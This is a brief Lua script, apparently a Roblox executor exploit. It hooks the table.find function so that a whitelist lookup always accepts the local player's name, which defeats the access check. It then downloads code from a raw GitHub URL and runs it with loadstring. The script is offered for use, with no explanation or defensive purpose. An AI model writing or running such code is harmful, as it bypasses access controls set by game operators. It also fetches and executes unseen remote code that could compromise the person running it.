local old

old = hookfunction(table.find, function(t, value, init)
    if value == game:GetService("Players").LocalPlayer.Name then
        return true
    else
        return old(t, value, init)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerReady/WHITELIS-OBFUSCATE/main/Whitelist", true))()